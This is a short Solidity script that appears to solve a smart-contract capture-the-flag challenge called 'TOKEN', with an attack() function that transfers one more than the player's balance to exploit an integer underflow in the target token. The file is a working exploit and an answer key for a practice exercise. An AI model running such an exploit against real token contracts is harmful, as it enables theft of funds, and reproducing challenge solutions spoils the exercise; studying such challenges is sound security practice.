// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Token} from "~/Token.sol";

contract Check is CheckScript("TOKEN") {}

contract Solve is SolveScript("TOKEN") {
    Token target;

    constructor() {
        target = Token(instance);
    }

    function attack() public override {
        target.transfer(address(0), target.balanceOf(player) + 1);
    }
}
